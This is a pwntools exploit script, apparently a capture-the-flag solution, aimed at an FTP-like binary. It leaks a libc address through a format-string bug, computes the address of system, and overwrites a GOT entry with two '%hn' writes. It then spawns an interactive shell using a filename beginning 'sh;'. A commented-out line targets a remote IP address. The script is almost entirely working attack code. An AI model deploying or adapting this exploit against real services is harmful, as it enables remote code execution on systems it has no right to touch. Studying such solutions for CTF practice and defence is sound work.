from pwn import *
context.log_level = 'debug'
#conn = remote('127.0.0.1',12345)
#conn = remote('106.2.25.7',8001)
conn=process("./pwn")
def putfile( conn , filename , content ) :
	print 'putting ' , content 
	conn.sendline('put')
	conn.recvuntil(':')
	conn.sendline(filename)
	conn.recvuntil(':')
	conn.sendline(content)
	conn.recvuntil('ftp>')
def getfile(conn , filename ) :
	conn.sendline('get')
	conn.recvuntil(':')
	conn.sendline(filename)
	return conn.recv(2048)
#raw_input('start')
conn.recv(2048)
conn.sendline('rxraclhm')
conn.recv(2048)
putfile(conn,'sh;','%91$x')
res = getfile( conn , 'sh;')
print res
#calculate put_got_addr , system_addr 
__libc_start_main = int(res[:8], 16)
system_addr = __libc_start_main - 0x18540 + 0x3ada0 
pause()
gdb.attach(conn)
#system_addr=0xf7e44940
print 'system addr ' , hex(system_addr)
put_got_addr = 0x0804A028

#conn.recv()
#write system_addr to put_addr , lowDword 
payload1 = p32(put_got_addr) + '%%%dc' % ((system_addr & 0xffff)-4) + '%7$hn'
putfile(conn , 'in/' , payload1)
getfile(conn , 'in/')
conn.recvuntil('ftp>')
#write system_addr to put_addr , highDword
payload2 = p32(put_got_addr+2) + '%%%dc' % ((system_addr>>16 & 0xffff)-4) + '%7$hn'
putfile(conn, '/b' , payload2)
getfile(conn,'/b')
conn.recvuntil('ftp>')
conn.sendline('dir')
conn.interactive()
